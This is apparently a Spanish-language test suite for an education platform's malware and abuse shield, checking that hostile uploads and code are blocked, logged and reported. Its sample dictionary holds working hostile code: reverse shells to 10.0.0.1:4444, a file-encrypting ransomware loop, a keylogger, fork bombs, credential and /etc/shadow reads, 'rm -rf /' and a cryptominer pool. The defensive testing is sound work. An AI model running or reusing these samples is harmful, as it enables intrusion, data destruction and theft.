"""Escudo de CódigoCamp de punta a punta: cada amenaza se bloquea, queda como infracción con su gravedad, le llega a la
persona un correo con la justificación y aparece en el panel. Y el código normal de un estudiante NO se bloquea."""
import io
import os
import struct
import time
import unittest
import zipfile

from flask import g

import utilidades
from app import create_app
from models import Incidente, User, db
from servicios.antivirus import EICAR
from servicios.codigo_malicioso import revisar_codigo

PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 64

MALICIOSOS = {
    "shell reversa (Python)": ("import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\n"
                               "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)\nsubprocess.call(['/bin/sh','-i'])", "critica"),
    "shell reversa (PHP)": ("<?php $sock=fsockopen('10.0.0.1',4444); shell_exec('/bin/sh -i <&3 >&3 2>&3'); ?>", "critica"),
    "shell reversa (C)": ("#include <sys/socket.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr*)&a,sizeof(a));"
                          "dup2(s,0);dup2(s,1);execve(\"/bin/sh\",0,0);}", "critica"),
    "minero": ("const pool = 'stratum+tcp://pool.minexmr.com:4444';\nstartMining(pool);", "critica"),
    "robar /etc/shadow": ("print(open('/etc/shadow').read())", "critica"),
    "robar .env de CódigoCamp": ("print(open('../../backend/.env').read())", "critica"),
    "robar claves por entorno": ("import os\nprint(os.environ.get('SECRET_KEY'), os.getenv('SMTP_APP_PASSWORD'))", "critica"),
    "ransomware": ("from cryptography.fernet import Fernet\nimport os\nk=Fernet(Fernet.generate_key())\n"
                   "for r,_,fs in os.walk('/home'):\n  for f in fs:\n    p=os.path.join(r,f); d=open(p,'rb').read()\n"
                   "    open(p+'.lock','wb').write(k.encrypt(d)); os.remove(p)", "critica"),
    "keylogger": ("from pynput import keyboard\ndef on_press(k): open('log.txt','a').write(str(k))\nkeyboard.Listener(on_press=on_press).start()", "alta"),
    "bomba fork (Python)": ("import os\nwhile True:\n    os.fork()", "alta"),
    "bomba fork (C)": ("#include <unistd.h>\nint main(){ for(;;) fork(); }", "alta"),
    "borrar carpeta personal": ("import shutil, os\nshutil.rmtree(os.path.expanduser('~'))", "alta"),
    "código escondido": ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))", "alta"),
    "comando dentro del programa": ("import os\nos.system('rm -rf / --no-preserve-root')", None),
    "PowerShell oculto en Java": ('Runtime.getRuntime().exec("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");', None),
}

NORMALES = {
    "servidor de chat con sockets": "import socket\ns=socket.socket()\ns.bind(('0.0.0.0',5000))\ns.listen()\nc,_=s.accept()\nc.send(b'hola')",
    "cliente HTTP": "import socket\ns=socket.socket()\ns.connect(('example.com',80))\ns.send(b'GET / HTTP/1.0\\r\\n\\r\\n')\nprint(s.recv(100))",
    "sqlite y un comando de menú": "import sqlite3\ncon=sqlite3.connect('a.db')\nopcion='cmd'\nprint(opcion)",
    "cifrar un texto": "from cryptography.fernet import Fernet\nk=Fernet(Fernet.generate_key())\nprint(k.encrypt(b'hola'))",
    "listar archivos": "import os\nfor r,d,f in os.walk('.'):\n    print(f)",
    "menú con while True": "while True:\n    op=input('> ')\n    if op=='salir': break",
    "variables de entorno propias": "import os\nprint(os.getenv('MI_VARIABLE', 'nada'))",
    "borrar un archivo temporal": "import os, shutil\nshutil.rmtree('build')\nos.remove('temp.txt')",
    "base64 normal": "import base64\nprint(base64.b64decode('aG9sYQ==').decode())",
    "Java con procesos": 'public class A { public static void main(String[] a) throws Exception { new ProcessBuilder("java","-version").start(); } }',
    "C con fork una vez": "#include <unistd.h>\nint main(){ if(fork()==0){ return 0; } return 0; }",
    "texto que habla de seguridad": "print('Nunca ejecutes rm en carpetas que no conoces')",
}


class DetectorCodigoTest(unittest.TestCase):
    def test_detecta_cada_tipo_de_programa_malicioso(self):
        for nombre, (codigo, gravedad) in MALICIOSOS.items():
            r = revisar_codigo(codigo)
            self.assertIsNotNone(r, f"no detectó: {nombre}")
            self.assertTrue(r["explicacion"], nombre)
            if gravedad:
                self.assertEqual(r["gravedad"], gravedad, nombre)

    def test_no_molesta_al_codigo_normal_de_un_estudiante(self):
        for nombre, codigo in NORMALES.items():
            self.assertIsNone(revisar_codigo(codigo), f"falso positivo: {nombre}")


class EscudoTest(unittest.TestCase):
    def setUp(self):
        utilidades._RATE_LIMITS.clear()
        from servicios import seguridad_enlaces
        seguridad_enlaces._cache.clear()
        self.app = create_app({"TESTING": True, "SECRET_KEY": "x", "SQLALCHEMY_DATABASE_URI": "sqlite://", "SESSION_COOKIE_SECURE": False,
                               "GOOGLE_CLIENT_ID": "", "GOOGLE_CLIENT_SECRET": ""})
        self.ctx = self.app.app_context(); self.ctx.push(); db.create_all()
        self.c = self.app.test_client()
        self.c.get("/api/auth/me/")
        self.c.csrf = {"X-CSRFToken": self.c.get_cookie("csrftoken").value}
        self.c.post("/api/auth/register/", json={"nombre": "Pepe", "email": "pepe@example.com", "password": "Clave123"}, headers=self.c.csrf)
        self.app.extensions["correos_enviados"] = []

    def tearDown(self):
        db.session.remove(); db.drop_all(); db.engine.dispose(); self.ctx.pop()

    def subir(self, datos, nombre):
        g.pop("_login_user", None)
        return self.c.post(f"/api/trabajo/archivos/?nombre={nombre}", data=datos, headers={**self.c.csrf, "Content-Type": "application/octet-stream"})

    def ultimo(self):
        return Incidente.query.order_by(Incidente.id.desc()).first()

    def correo_de(self, inc):
        correos = [c for c in self.app.extensions["correos_enviados"] if c["para"] == "pepe@example.com"]
        self.assertTrue(correos, "no se envió correo")
        html = correos[-1]["html"]
        self.assertIn("Por qué es una infracción", html)
        self.assertIn("Qué detectamos", html)
        self.assertIn("Gravedad", html)
        self.assertIn("Términos y condiciones", html)
        self.assertEqual(inc.correo_estado, "enviado")
        return html

    @staticmethod
    def _zip(entradas):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            for n, d in entradas:
                z.writestr(n, d)
        return b.getvalue()

    def test_archivos_peligrosos_se_bloquean_y_avisan_con_justificacion(self):
        macho = struct.pack("<I", 0xfeedfacf) + b"\0" * 60
        casos = [
            (b"hola " + EICAR, "tarea.txt", "critica"),
            (b"MZ" + b"\0" * 200, "foto.png", "alta"),                    # .exe disfrazado de imagen
            (b"\x7fELF" + b"\0" * 200, "datos.bin", "alta"),              # programa de Linux
            (macho, "app", "alta"),                                        # programa de macOS
            (b"x", "juego.exe", "media"),
            (b"x", "notas.docm", "media"),
            (b"x", "foto.jpg.bat", "alta"),
            (b"x", "factura‮gpj.exe", "media"),
            (self._zip([("instalar.exe", b"MZ" + b"\0" * 60)]), "proyecto.zip", "alta"),
            (self._zip([("a/virus.txt", EICAR)]), "proyecto.zip", "media"),
            (MALICIOSOS["shell reversa (Python)"][0].encode(), "tarea.py", "critica"),
            (self._zip([("src/main.py", MALICIOSOS["minero"][0])]), "proyecto.zip", "media"),
            (MALICIOSOS["ransomware"][0].encode(), "backup.py", "critica"),
        ]
        for datos, nombre, _ in casos:
            antes = Incidente.query.count()
            r = self.subir(datos, nombre)
            self.assertEqual(r.status_code, 422, f"no bloqueó {nombre}: {r.get_json()}")
            self.assertEqual(Incidente.query.count(), antes + 1, nombre)
            inc = self.ultimo()
            self.assertEqual(inc.tipo, "archivo")
            self.assertTrue(inc.explicacion, nombre)
            self.correo_de(inc)

    def test_bomba_zip(self):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("ceros.txt", b"\0" * (60 * 1024 * 1024))
        self.assertEqual(self.subir(b.getvalue(), "bomba.zip").status_code, 422)
        self.assertIn("bomba zip", self.ultimo().motivo)

    def test_archivos_normales_pasan(self):
        for datos, nombre in [(PNG, "a.png"), (NORMALES["servidor de chat con sockets"].encode(), "server.py"),
                              (self._zip([("App/bin/Debug/App.exe", b"MZ" + b"\0" * 60), ("App/Program.cs", "class P{}")]), "app.zip")]:
            self.assertEqual(self.subir(datos, nombre).status_code, 201, nombre)
        self.assertEqual(Incidente.query.count(), 0)

    def test_codigo_malicioso_no_se_ejecuta_en_el_servidor(self):
        g.pop("_login_user", None)
        r = self.c.post("/api/run", json={"lenguaje": "c", "codigo": MALICIOSOS["bomba fork (C)"][0]}, headers=self.c.csrf)
        self.assertEqual(r.status_code, 403)
        inc = self.ultimo()
        self.assertEqual((inc.tipo, inc.gravedad), ("codigo", "alta"))
        self.assertIn("fork", inc.evidencia)
        self.correo_de(inc)
        g.pop("_login_user", None)
        r = self.c.post("/api/python/run", json={"ruta": "main.py", "archivos": [{"ruta": "main.py", "contenido": MALICIOSOS["robar claves por entorno"][0]}]}, headers=self.c.csrf)
        self.assertEqual(r.status_code, 403)
        self.assertEqual(self.ultimo().gravedad, "critica")
        g.pop("_login_user", None)
        r = self.c.post("/api/trabajo/php/iniciar", json={"archivos": [{"ruta": "index.php", "contenido": MALICIOSOS["shell reversa (PHP)"][0]}]}, headers=self.c.csrf)
        self.assertEqual(r.status_code, 403)
        g.pop("_login_user", None)
        r = self.c.post("/api/docker", json={"args": ["run", "alpine", "sh", "-c", "rm -rf / --no-preserve-root"]}, headers=self.c.csrf)
        self.assertEqual(r.status_code, 403)
        self.assertEqual(self.ultimo().tipo, "comando")
        # El código normal NO se frena (puede fallar por no tener compilador, pero nunca con 403)
        antes = Incidente.query.count()
        g.pop("_login_user", None)
        r = self.c.post("/api/run", json={"lenguaje": "c", "codigo": NORMALES["C con fork una vez"]}, headers=self.c.csrf)
        self.assertNotEqual(r.status_code, 403)
        self.assertEqual(Incidente.query.count(), antes)

    def test_enlace_peligroso_en_el_chat(self):
        from models import Friendship
        otro = User(nombre="Ana", email="ana@example.com", password_hash="x"); db.session.add(otro); db.session.commit()
        yo = User.query.filter_by(email="pepe@example.com").one()
        f = Friendship(de_usuario_id=yo.id, a_usuario_id=otro.id, estado="aceptada"); db.session.add(f); db.session.commit()
        g.pop("_login_user", None)
        r = self.c.post(f"/api/chat/{f.id}/", json={"texto": "mira esto https://g00gle.com/login"}, headers=self.c.csrf)
        self.assertEqual(r.status_code, 403)
        inc = self.ultimo()
        self.assertEqual((inc.tipo, inc.origen), ("enlace", "mensaje de chat"))
        html = self.correo_de(inc)
        self.assertNotIn("https://g00gle.com", html, "el enlace va desactivado en el correo")
        self.assertIn("hxxps://g00gle[.]com", html)
        g.pop("_login_user", None)
        self.assertEqual(self.c.post(f"/api/chat/{f.id}/", json={"texto": "mira https://github.com"}, headers=self.c.csrf).status_code, 200)

    def test_foto_de_perfil_con_virus(self):
        g.pop("_login_user", None)
        r = self.c.post("/api/perfil/foto/", data=PNG + EICAR, headers={**self.c.csrf, "Content-Type": "application/octet-stream"})
        self.assertEqual(r.status_code, 422)
        self.assertEqual(self.ultimo().origen, "foto de perfil")

    def test_correo_por_cada_infraccion(self):
        from servicios.moderacion import registrar
        u = User.query.filter_by(email="pepe@example.com").one()
        for _ in range(3):
            registrar(u, "comando", "apaga o reinicia el equipo")
        self.assertEqual(len([c for c in self.app.extensions["correos_enviados"] if c["para"] == u.email]), 3)

    def test_sin_smtp_el_panel_sabe_que_el_correo_no_salio(self):
        from servicios.moderacion import registrar
        for k in [k for k in os.environ if k.startswith(("SMTP_", "MAIL_"))]:
            os.environ.pop(k)
        u = User.query.filter_by(email="pepe@example.com").one()
        self.app.config["TESTING"] = False
        try:
            inc = registrar(u, "enlace", "sitio de estafa", evidencia="https://g00gle.com")
            for _ in range(50):
                db.session.expire_all()
                if db.session.get(Incidente, inc.id).correo_estado != "pendiente":
                    break
                time.sleep(0.05)
        finally:
            self.app.config["TESTING"] = True
        inc = db.session.get(Incidente, inc.id)
        self.assertEqual(inc.correo_estado, "sin_smtp")
        self.assertIn("SMTP", inc.correo_detalle)


if __name__ == "__main__":
    unittest.main()
